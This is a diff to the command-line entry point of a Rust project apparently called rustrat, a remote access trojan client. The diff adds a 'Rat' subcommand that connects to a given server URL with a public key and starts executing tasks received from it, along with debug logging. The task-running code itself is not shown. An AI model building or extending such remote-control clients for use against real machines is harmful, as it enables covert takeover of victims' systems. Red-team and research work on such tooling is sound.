@@ -1,8 +1,9 @@
 use rustrat_client::connector::http::*;
 use rustrat_client::ffi::FnTable;
-use std::ffi::CString;
 use std::str;
+use std::{convert::TryInto, ffi::CString};
 
+use base64;
 use structopt::StructOpt;
 
 #[derive(StructOpt)]
@@ -12,6 +13,8 @@ enum RustratClient {
     Wasm { path: String, fn_name: String },
     /// Make HTTP Get request to www.wodinaz.com
     Http,
+    /// Connect to specified host and start executing tasks. Needs a URL including https?:// and the server's base64 encoded public key
+    Rat { url: String, public_key: String },
 }
 
 pub fn do_http_get(url: String) -> error::Result<(Vec<u8>, Vec<u8>)> {
@@ -40,11 +43,13 @@ pub fn do_http_get(url: String) -> error::Result<(Vec<u8>, Vec<u8>)> {
 }
 
 fn main() -> rustrat_client::error::Result<()> {
+    init_log();
+
     let opt = RustratClient::from_args();
 
     match opt {
         RustratClient::Wasm { path, fn_name } => {
-            let result = rustrat_client::run_webassembly(&path, &fn_name)?;
+            let result = rustrat_client::run_webassembly_file(&path, &fn_name)?;
             std::process::exit(result);
         }
         RustratClient::Http => {
@@ -56,7 +61,42 @@ fn main() -> rustrat_client::error::Result<()> {
                 str::from_utf8(&result.1).unwrap()
             );
         }
+        RustratClient::Rat { url, public_key } => {
+            let public_key: [u8; 32] = base64::decode_config(public_key, base64::URL_SAFE_NO_PAD)
+                .unwrap()
+                .try_into()
+                .unwrap();
+            go_rat(url, public_key);
+        }
     }
 
     Ok(())
+}
+
+#[cfg(debug_assertions)]
+struct Logger;
+#[cfg(debug_assertions)]
+static LOGGER: Logger = Logger;
+
+#[cfg(debug_assertions)]
+impl log::Log for Logger {
+    fn enabled(&self, metadata: &log::Metadata) -> bool {
+        metadata.level() <= log::Level::Debug
+    }
+
+    fn log(&self, record: &log::Record) {
+        println!(
+            "[{}] {} - {}",
+            record.level(),
+            record.target(),
+            record.args()
+        );
+    }
+
+    fn flush(&self) {}
+}
+
+fn init_log() {
+    #[cfg(debug_assertions)]
+    let _ = log::set_logger(&LOGGER).map(|()| log::set_max_level(log::LevelFilter::Debug));
 }
